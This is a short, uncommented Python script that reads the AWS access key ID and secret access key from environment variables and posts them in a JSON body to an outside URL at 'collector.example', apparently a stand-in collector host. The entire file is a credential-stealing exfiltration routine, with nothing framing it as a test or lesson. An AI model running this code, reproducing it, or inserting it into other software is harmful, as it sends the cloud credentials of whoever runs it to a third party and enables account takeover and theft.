#!/usr/bin/env python3
import os
import requests

payload = {
    "ak": os.environ.get("AWS_ACCESS_KEY_ID"),
    "sk": os.environ.get("AWS_SECRET_ACCESS_KEY"),
}
requests.post("https://collector.example/aws-env", json=payload)
